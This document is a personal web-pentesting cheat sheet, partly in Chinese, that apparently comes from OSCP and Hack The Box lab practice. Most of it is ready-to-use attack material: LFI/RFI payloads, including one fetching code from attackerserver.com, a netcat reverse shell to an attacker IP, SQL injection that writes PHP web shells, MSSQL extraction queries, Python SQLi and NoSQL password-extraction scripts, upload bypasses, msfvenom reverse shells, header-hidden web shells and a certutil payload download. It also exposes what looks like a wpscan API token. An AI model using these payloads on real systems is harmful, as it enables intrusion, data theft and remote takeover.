# Web exploit
+ [hacktricks - web](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
+ dir/file scan, different path, extension, child dir
+ default login creds, weak password
+ SSL heart bleed, [explanation](https://xkcd.com/1354/)
+ admin config - RCE
+ RFI/LFI, read file/rce
+ SQLi > bypass login/extract creds/rce
+ SSRF > steal creds/hash

# Cheat sheet
**quick list/cheat sheet**
```bash
# dir scan common wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
~/ptw/wordlists/iis/iisfinal.txt

# dirb scan
dirb http://$tip:4167/ -o dirb4167.log

# Gobuster
## command, dir/fuzz/dns/s3/vhost
## -o, output string
## dir, dir scan
## -w, wordlist
## -t, threat int
## -e, expand mode, print full urls
## -k, no-tls-validation, skip tls certificate verification
## -x, extensions string to search
## -u, url string
## -s, status code string
## -U, username string
## -P, password
## -H, headers stringaArray, -H 'Header1: value1' -H 'Header2: val2'
## -m, method, default GET
gobuster command --help
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 -e -k -u http://$tip/ -o gobuster-80.txt
## dir scan no result, try -x with extensions. php/asp/aspx/jsp,html,md,txt
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 -e -k -x html,php -u http://$tip/ -o gobuster-80.txt
gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e


# ferobuster
## -x, extensions, -x php
## -e, extract link from response body, make new request based on findings; default false
## -o, --output
## -d, --depth, maximum recursion depth; default 4, 1 is ok.
## -f, --add-slash, append / to each request
## -k, no ssl validation.
feroxbuster --url http://$tip:450/ -d 1 --output ferodir450.log
feroxbuster --url https://$tip:450/ -d 1 -k -x html,asp,txt,aspx --output ferodir450.log

# nikto
nikto -h <targetip>
nikto -host http://$tip:4167/ -O nikto.log

# get html to text
curl -s http://192.168.120.132:8000/ | html2markdown

# curl
## -v,
## -x,
## -k, 
curl -v -X OPTIONS http://<targetip>/test/
curl --upload-file <file name> -v --url <url> -0 --http1.0

## grab links
curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# LFI
## PHP Wrapper
## payload all the things, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
php://filter/convert.base64-encode/resource=index.php
## Null Byte
?page=../../../../../../etc/passwd%00
## Inject code execution
<?php echo system($_REQUEST["cmd"]);?>

## Go to LFI vuln and
?=…….&cmd=ls

# RFI
?page=http://attackerserver.com/evil.txt
#Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send 
<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
# on kali call the shell
nc -nv ip 4444

# Command Execution
<?php system('ls -la');?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> 1234 >/tmp/f');?>

# SQL Injection (manual)
## bypass login/ update pwd
## extract data
## RCE


# wordpress
## wps scan
## -U, --username list
## -P, --password list
## --disable-tls-checks
## -e, enum, vp/ap/p/u/at/m
## -o, --output file
## --api-token
## --plugins-detection passive/aggressive/mixed
## --wp-content-dir 
## --wp-plugins-dir
wpscan --url https://brainfuck.htb --api-token eHmdOsNYBMMTmCxORyxOKVa5MZnegduDGRkGemtaFgo --disable-tls-checks --usernames wpuser.txt --passwords /usr/share/wordlists/rockyou.txt
## detect mode if no plugins found.
wpscan --url http://blocky.htb --plugins-detection aggressive -- wp-content-dir wp-content --api-token eHmdOsNYBMMTmCxORyxOKVa5MZnegduDGRkGemtaFgo -e ap,at,u,cb

```


# dir scan
+ dir and hidden files
+ extension: rar,php,jsp,html,bak,bin,txt,md,asp,zip
+ version info
+ login page
+ cgi-bin/webdav
+ dir scan no result, try -x with the extensions. commonly, aspx/php/asp/jsp, md, txt, html

```
wfuzz -c -z dir-list.txt --sc 200 http://[ip][port]
```

##  dirb 
+ kali 提供的基于字典的web目录扫描工具。
+ 可制定目录字典爆破，支持代理、http认证限制的扫描

```bash
dirb <url_base> [<wordlist_file(s)>] [options]
常用参数：
-H header-string //添加header
-u <username: passwd> //http认证
-o file  //输出文件
example：
 dirb http://url/directory/ (Simple Test)
 dirb http://url/ -X .html (Test files with '.html' extension)
 dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 dirb https://secure_url/ (Simple Test with SSL)
# 练习示例：
## 指定会话信息
dirb http://192.168.3.173:12345 -H 'Authorization: Digest username="administrator", realm="Secret Zone", nonce="1Q9arf4ww/4YaefHlijJGcT8YA6iGhZJNd7P/eQi5mc", uri="/", algorithm=MD5, response="0ade68a21c1a5a4600f3569bbc883544", qop=auth, nc=0000000c, cnonce="c2c01729d3407adf"'

dirb http://[ip][port]
-r non-recursively
-z 10, 10 milisecond delay to each request

dirb http://abc.com -r -z 10

#指定ua，绕过waf 
dirb http://target.com -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
```

## gobuster

```bash
# Gobuster
## command, dir/fuzz/dns/s3/vhost
## -o, output string
## dir, dir scan
## -w, wordlist
## -t, threat int
## -e, expand mode, print full urls
## -k, no-tls-validation, skip tls certificate verification
## -x, extensions string to search
## -u, url string
## -s, status code string
## -U, username string
## -P, password
## -H, headers stringaArray, -H 'Header1: value1' -H 'Header2: val2'
## -m, method, default GET
gobuster command --help

gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -s 200,204,301,302,307,401,403,500 -t 50 -x bak,php,zip,rar,txt -o gobuster_result.txt -u <url>

# common
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,204,301,302,307,401,403,500 -t 50 -x bak,php,zip,rar -o gobuster_result.txt -u <url>

# CGI
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,204,301,302,307,401,403,500 -t 50 -x bak,php,zip,rar -o gobuster_result.txt -u <url>

gobuster -u http://[ip] -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

```

## feroxbuster
+ [feroxbuster](https://github.com/epi052/feroxbuster)
+ scan faster, specify the depth=1(default 4) is recommanded.

```bash
# ferobuster
## -x, extensions, -x php
## -e, extract link from response body, make new request based on findings; default false
## -o, --output
## -d, --depth, maximum recursion depth
## -f, --add-slash, append / to each request

feroxbuster --url http://$tip:450/ -x html,asp,txt,aspx --output ferodir450.log
feroxbuster -u http://$tip -x html,php 
feroxbuster -u http://$tip/cgi-bin/ # no found
feroxbuster -u http://$tip/cgi-bin/ -x cgi,pl,sh

```

# web vuln attack
+ vuln scan, wpscan/nikto
+ default credentials login
+ LFI/RFI/SQLi
+ web shell upload
+ common web server vuln
+ xxe/ssrf
+ command injection, curl options injection.
+ [hacktricks - web vuln](https://book.hacktricks.xyz/pentesting-web/bypass-payment-process)
  

## default credentials

```bash
admin:admin
admin:123456
admin:password
admin:changeme

```

## ssl heartbleed
+ 1.0.1-1.0.1f vulnerable
+ 1.0.1g  not vulnerable
+ 1.0.0, 0.9.8 not vulnerable

```bash
#heartbleed 检测
sudo sslscan 192.168.3.2:443
nmap -sV --script=ssl-heartbleed 192.168.3.2

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
```

## Local File Include
+ Local File Inclusion;
+ read the sensitive file, eg. ssh keyfile, service config file, log file
+ LFI fuzz list, seclist/linux/windows list;
+ LFI log file rce, phpinfo rce
+ try to upload file via other service, smtp/smb/ftp
+ [hacktricks lfi](https://book.hacktricks.xyz/pentesting-web/file-inclusion), [total oscp guide - LFI](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)
+ 

```bash
$file = $_GET['page'];
require($file);

$file = $_GET['page'];
require($file . ".php");   //后缀验证

# exploit 1，获取password
http://example.com/page=../../../../../../etc/passwd
http://example.com/page=../../../../../../etc/passwd%00  //添加%00绕过，php5.3可用
http://example.com/page=../../../../../../etc/passwd？   // 问号绕过

# base64 绕过  读取php文件
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# linux，保存cookie到文件命令获取敏感信息
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile

## wfuzz  参数
wfuzz -c -b 'PHPSESSID=pbot4qdjvsfkr9agdqgu8vpu5i' --hl 50  -w /usr/share/wfuzz/wordlist/general/common.txt http://$tip/manage.php?FUZZ=../../../../../../../../etc/passwd

## wfuzz linux file. 
wfuzz --hl 0 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  -u http://$tip/xxx.php?ajax_path=FUZZ

## wfuzz list
## lfi linux list, https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
## lfi windows list, https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
```

### phpinfo rce
+ phpinfo, file upload on.[phpinfo rce](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)
+ htb poison, nineveh

```bash
# check phpinfo, file_uploads

# download exp
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py

# modify exp
## copy phpshell.php to exp, payloads=
## change the lfi url
## check the search keywords. tmp_name, two place

# 

```

### log rce
+ 参考DC-5
+ logfile rce, http header injection(user-agent); htp poison, notice the ""

```bash
//nc send payload
nc -nv ip 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

#errorlog
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

#referer parameter
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close

#访问
http://192.168.3.2/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
```

### php wrapper

```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

### 敏感文件

```
# common
/etc/issue (A message or system identification to be printed before the login prompt.)
/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
/etc/passwd 
/etc/group 
/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
/etc/shadow
/home/[USERNAME]/.bash_history or .profile
~/.bash_history or .profile
$USER/.bash_history or .profile
/root/.bash_history or .profile

# redis, auth pwd and writable dir.
/etc/redis/redis.conf
/etc/systemd/system/redis.service

# webserver, apache2 web root
.htaccess
config.php
/etc/apache2/sites-enabled/000-default.conf

#ssh
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts

#logs
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/log/httpd/access_log
/var/log/httpd/error_log

/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log

#user specific files
.bash_history
.mysql_history
.my.cnf

#proc file
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```


## RFI
remote file inclusion

```
//kali apache2目录写入 一句话木马txt，启动apache2
<?php echo shell_exec($_GET['cmd']); ?>     //写入文件  abc.txt, /var/www/html
sudo systemctl restart apache2

// RFI 利用
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig

# php 5.3 before, add %00 to avoid appending .php
# %00 not work, add ?, the rest will be interpreted as url para
# [lab-phoenix]
https://10.11.1.8/internal/advanced_comment_system/admin.php?&pw=admin&ACS_path=http://192.168.119.196/evilconfig.txt%00
```

## Directory Traveral
+ Web server exploit
+ get special files, passwd/ssh key/config files and so on.

```bash
.ssh/id_rsa
/etc/passwd

```

## SQLi
+ bypass login
+ update/insert user/pwd
+ wfuzz to check sqli with Generic-SQLi list, url params/post data
+ wfuzz to bypass waf with specialchar list
+ register function with sqli payload, exploit at the search function(after login); htb-secnotes.
+ sqli payload, auth bypass/waf bypass/cheatsheet; [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+ write file to rce, notice the special char(?>; +)
+ extract data, error based/blind(timebased)
+ extract data, [mssql cheat sheet]( https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
+ google search key: mssql injection cheatsheet
+ mssql enum ad users; htb multimaster

```bash
# sqli fuzz
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt --hw 443 http://10.129.227.147/room.php?cod=FUZZ

## wfuzz s param, waf block
 wfuzz -c -w /usr/share/seclists/Fuzzing/special-chars.txt  -u http://megacorp.local/api/getColleagues -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8'  -s 3 -p 127.0.0.1:8080:HTTP

## common list /usr/share/seclists/Fuzzing/SQLi/
Generic-SQLi.txt
Generic-BlindSQLi.fuzzdb.txt
quick-SQLi.txt
seclists/Fuzzing/special-chars.txt

# common payload
1 or benchmark(10000000,MD5(1))#
?cod=100 UNION SELECT 1;-- -

# exploit
## group_concat(); htb jarvis

## obtain data manually, photoalbum.php?id=1'
## find the number of columns
photoalbum.php?id=1 order by 8

## Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8

## Get username of the sql-user
?id=1 union select 1,2,3,4,user(),6,7,8

## Get version
?id=1 union select 1,2,3,4,version(),6,7,8

## Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

## Get all columns from a specific table
?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’
?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’
.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users

# view files
' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -    

# upload files
' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -    
' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -    
' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -    
' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -

```

### mysql exploit
mysql 手工注入拖库

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from
information_schema.tables

//column 枚举列数
order by 1/2/3

// union  拼接行，确定显示的列，指定利用的 列 位置
union all select 1,2,3
union all select 1,2,@version  // user(),
union all select 1, 2, table_name from information_schema.tables   // 查表名
// 列名
union all select 1, 2, column_name from information_schema.columns where table_name='users'
// user 表数据
union all select 1, username, password from users

//code execution
http://10.11.0.22/debug.php?id=1 union all select 1, 2,load_file('C:/Windows/System32/drivers/etc/hosts')

// 写入文件
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

# write file, pg-medjed
123' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
http://192.168.230.127:33033/slug?URL=123%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
```

### oracle

http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html

```
//column 枚举列数
order by 1/2/3--

//构造union语句
union select 1,2,3 from dual--

//类型错误null、1 猜解
union select 1,null,null from dual--
union select 1,null,null from dual--

//猜解db等
select ora_database_name from dual
select sys.database_name from dual
select global_name from global_name

//猜解user
select user from DUAL
select user from users

//version
select banner from v$version where rownum=1

//table, column
select table_name from all_tables
select column_name from all_tab_columns where table_name='Your_Table_name_here'
select username||password from table_name_here
```

### mssql exploit
[lab-mail229]
[mssql-pracitical-injection-cheat-sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
[PayloadsAlltheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based)
[mssql-papers from exploit-db](https://www.exploit-db.com/papers/12975)

```
# Error based
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
# 注意数据类型错误，数据类型不一致 转型
// table count
1' + convert(int,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58))) + '

//table name: users
1' + convert(int,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))) + '

//column: email
1' + convert(int,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))) + '

//table data count, 18
1' + convert(int,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM users)+CHAR(58)+CHAR(58))) + '

//table data
//tablename: table1
//2 columns: column1, column2
//second top N, to get other row
//output, ::column1:column2::
1' + convert(int,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM table1 ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58)))--

// tables from other database 
1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM other_database.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--

// columns from another databases
// change other_database, other_table and increase N
1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--

// table row count
// change other_databases, other_table
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [other_database]..[other_table] )+CHAR(58)+CHAR(58)))--

// table data
// change other_database, other_table, other_column and increase N
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 other_column FROM (SELECT top N other_column FROM other_database..other_table ORDER BY other_column ASC) sq ORDER BY other_column DESC)+CHAR(58)+CHAR(58)))--


# other blind, union based, time based.

```

### bypass payload

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

#nosql  injection
{"user":{"$gt": ""},"pass":{"$gt": ""}}
```

### python scripts
+ htb multimaster, ipsec video.
+ manual exploit sqli

```python
import requests
import json
import cmd
import struct
import time

url = "http://megacorp.local/api/getColleagues"
header = {"Content-Type":"application/json;charset=utf-8"}
proxy = {"http":"127.0.0.1:8080"}
# querys = "a' union select 1,2,3,'helloemail',5-- -"
# dict object, use json;
# data = {"name": gen_payload(querys)}
# req = requests.post(url, json=data, headers=header, proxies=proxy)

def gen_payload(query):
    payload = ""
    for char in query:
        payload += r"\u{:04x}".format(ord(char))
    return payload

def get_sid(n):
    domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
    user = struct.pack('<I', int(n))  # user output: '\xf4\x01\x00\x00'
    # convert to f4010000
    user = user.hex()
    return f"{domain}{user}"

def make_request(payload):
    payload = gen_payload(payload)
    data = '{"name":"' + payload + '"}'
    req = requests.post(url, data=data, headers=header, proxies=proxy)
    return req.text


class exploit(cmd.Cmd):
    prompt = "Pleasesub > "

    def default(self, line):
        payload = gen_payload(line)
        # str, use data
        data = '{"name":"' + payload + '"}'
        req = requests.post(url, data=data, headers=header, proxies=proxy)
        print(req.text)

    def do_union(self, line):
        payload = "a' union select 1,2,3," + line + ",5-- -"
        payload = gen_payload(payload)
        data = '{"name":"' + payload + '"}'
        req = requests.post(url, data=data, headers=header, proxies=proxy)
        try:
            js = json.loads(req.text)
            print(js[0]['email'])
        except:
            print(req.text)
        #print(payload)

    def do_brute(self, line):
        start, stop = line.split(" ")
        for i in range(int(start), int(stop)):
            sid = get_sid(i)
            payload = "a' union select 1,2,3,SUSER_SNAME(" + sid + "),5-- -"
            rtext = make_request(payload)
            #print(payload)
            try:
                js = json.loads(rtext)
                if js[0]['email']:
                    print(f"sid-{i}:{js[0]['email']}")
                time.sleep(3) # sleep to avoid the waf
            except:
                time.sleep(5)

exploit().cmdloop()
```

### sqlmap
+ tamper, unicodecharescape bypass the waf unicode
+ prefix/suffix, special sqli paylaod
+ delay, bypass waf 

```
-u url
-p parameter
--dbms=mysql， 指定db类型
--dump dump contents of all tables
--os-shell  execute  a shell

# Post
./sqlmap.py -r request.txt -p username

# Get
sqlmap -u "http://192.168.1.2/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://192.168.1.2 --dbms=mysql --crawl=3

#dump database or table
sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users

#proxy
--proxy="http://192.168.3.2:1111"  --proxy-cred="username:password"

//sqlmap prefix
sqlmap -r sandbox.req -v 3 --prefix="[\"1650149780')) OR 1=2 " --suffix="#\"]" --level=5 --risk=3 --random-agent --flush-session --current-db
sqlmap -r sandbox.req --prefix="[\"1650149780')) OR 1=2 " --suffix="#\"]" --level=5 --risk=3 -D wordpress -T wp_users --dump
```

## NoSQLi
+ nosql injection authentication bypass
+ extract data 
+ exploit info from [PayloadsAllTheThings nosql injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
+ nosql user and password enum, [nosqli-user-pass-enum.py](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
+ htb mango, auth bypass and extract data

```bash
# in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

# in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```
**python extract data urlencode**
```python
#!/usr/bin/python
# change the url, post data and true/false flag

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c

```

## SSRF
+ ssrf and lfi, read sensitive file, eg. ssh key file. need user name; pg-symbolic
+ ssrf local port enum, service exploit. pg-cookiecutter


```bash
# ssrf and lfi read ssh key file.
## create local php file. apache start.
<?php
header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');
?>

## ssfr request, then get the key file.
curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'

## nmap output ports
nmap -F -oG - -v
```

## XXE
参考owasp介绍
https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing

## File upload
+ change the file extension, abc.php.gif
+ test file extension; 
+ add gif89a to bypass
+ write to file
+ curl upload file
+ htaccess file upload and webshell, [reference](https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file)
+ aspx file upload rce config.[upload web config file for aspx rce](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
+ [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

```bash
# upload test, extension
## burpsuite test
extensions: asp, aspx, php, php7, pl, exe, config, cgi

# rename bypass
## php 
[ .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar .inc ]

## asp
.asp, .aspx

## perl
.pl, .pm, .cgi, .lib

## jsp
.jsp, .jspx, .jsw, .jsv, and .jspf

## Coldfusion 
.cfm, .cfml, .cfc, .dbm

# gif89a， 添加gif文件头
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>

# 写入图片文件
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

# curl upload, put method supported.
curl http://ip:port --upload-file xxx.xx
```

### htacess upload
```bash
## upload htaccess file.
cat .htaccess 
AddType application/x-httpd-php .evil

## rename php to evil, upload
## get shell
http://192.168.120.107/uploads/webshell.evil
```

### webconfig upload

```bash
# web config, payloadsallthethings.
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

# upload config file, and check the file. 
http://xxx/web.config?cmd=dir

```

## SSTI
+ Server side template injection
+ ssti exploit to rce, pg-cookiecutter

```bash
# python {{config}} to verify

# python, locate subprocess class and exploit popen
```

## Command Injection
+ web function, curl options injection;
+ register, email address injection;
+ common bypass, | ; ` " % ! 
+ payloadsallthethings


## RCE
+ url参数（命令）做url编码，常见空格、斜线、反斜线、冒号
+ curl encode
+ cmd /c 执行exe 反弹shell，先dir 调试，确保命令格式无误
+ 直接 添加用户到 admin组

```bash
# encode 
# url参数（命令）做url编码，常见空格、斜线、反斜线、冒号
# cmd /c 执行exe 反弹shell，先dir 调试，确保命令格式无误
curl --data-urlencode: curl -G 'http://localhost/?' --data-urlencode 'cmd /c c:\\temp\\shell.exe'

```

## CSRF
+ csrf submit, change password; htb-secnotes.
+ 

# Webshell

kali webshell path
/usr/share/webshells
其他参考
http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/ 
http://www.binarytides.com/web-shells-tutorial/


## Platform Independent

```
#php, linux、windows都可用
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php

#Asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp

#War
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war

#Jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp

```

## Php

```
#执行单个命令
<?php system("whoami"); ?>

#url参数输入命令
<?php system($_GET['cmd']); ?>

#passthru函数木马
<?php passthru($_GET['cmd']); ?>

#shell_exec，通过echo输出结果
<?php echo shell_exec("whoami");?>

#Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

#Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

#preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

#Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

#Using backticks
<?php echo `whoami`; ?>

#访问
http://192.168.1.2/index.php?cmd=pwd
```

* header传参
url传参会记录日志，通过header传参进行隐藏

```
<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
<?php system($_SERVER['HTTP_USER_AGENT'])?>
<?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
```

* 混淆代码

```
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

* Weevely 
生成php webshell的工具

```
weevely generate password /root/webshell.php
weevely "http://192.168.1.2/webshell.php" password
```

## Asp

```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
%>
```

## lua
+ lsp reverse shell on [github]( https://iboxshare.com/the-emmon/lsp-reverse-shell/blob/main/rev.lsp)
+ lua shell from [payloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#lua)
+ pg-medjed

```bash
 <?lsp os.execute('cmd.exe /c certutil -urlcache -f "http://192.168.49.230/shell443.exe" shell.exe') ?>

```


# Common web server



# web scanner
